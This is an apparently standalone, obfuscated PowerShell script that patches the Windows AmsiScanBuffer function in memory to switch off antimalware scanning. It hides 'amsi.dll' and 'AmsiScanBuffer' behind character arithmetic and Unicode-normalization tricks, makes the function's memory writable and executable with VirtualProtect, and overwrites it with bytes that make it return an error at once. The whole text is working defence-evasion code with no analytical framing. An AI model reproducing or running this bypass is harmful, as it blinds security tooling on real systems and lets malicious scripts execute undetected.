$rp8RM9bKNV = @"
using System;
using System.Runtime.InteropServices;
public class rp8RM9bKNV {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr mSTYSVQHSRH_eQOj, string bbEQf4T4B);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr i8AfJPtJvSp7IuJzD, UIntPtr bXP2RTecLKbefizr, uint mdZBOaQgz3avlwl6nmC, out uint Zb3ID2nL);
}
"@

Add-Type $rp8RM9bKNV

$DevpMt72qs8LFobVT = [rp8RM9bKNV]::LoadLibrary("$(('ãms'+'í.d'+'ll').NOrmaLIzE([cHaR]([BytE]0x46)+[CHAR]([Byte]0x6f)+[ChAr](114)+[CHar]([Byte]0x6d)+[cHar](68*52/52)) -replace [chAr](25+67)+[ChaR](112+60-60)+[Char](45+78)+[chAr](77+3-3)+[CHAR]([bYTe]0x6e)+[CHAr]([ByTE]0x7d))")
$O5fbPU8gaownmR1j = [rp8RM9bKNV]::GetProcAddress($DevpMt72qs8LFobVT, "$(('ÂmsíScánB'+'úffér').NORMaLiZe([char](70)+[Char]([bYTe]0x6f)+[ChAr](114*112/112)+[cHar]([bYte]0x6d)+[Char](68)) -replace [cHAR](92+81-81)+[ChAr](112+11-11)+[ChAr]([BYTE]0x7b)+[cHaR]([Byte]0x4d)+[chaR](110*19/19)+[cHaR]([byte]0x7d))")
$p = 0
[rp8RM9bKNV]::VirtualProtect($O5fbPU8gaownmR1j, [uint32]5, 0x40, [ref]$p)
$vYc2aQobREmwkILt9 = "0xB8"
$tM4 = "0x57"
$bZuGMmPxO5KUS = "0x00"
$ppQx2cySfE = "0x07"
$LGFZODQhrjl9Zq9Un_l = "0x80"
$NnjPTkFW502mBCZo = "0xC3"
$zq6L974byTVrTbHoj = [Byte[]] ($vYc2aQobREmwkILt9,$tM4,$bZuGMmPxO5KUS,$ppQx2cySfE,+$LGFZODQhrjl9Zq9Un_l,+$NnjPTkFW502mBCZo)
[System.Runtime.InteropServices.Marshal]::Copy($zq6L974byTVrTbHoj, 0, $O5fbPU8gaownmR1j, 6)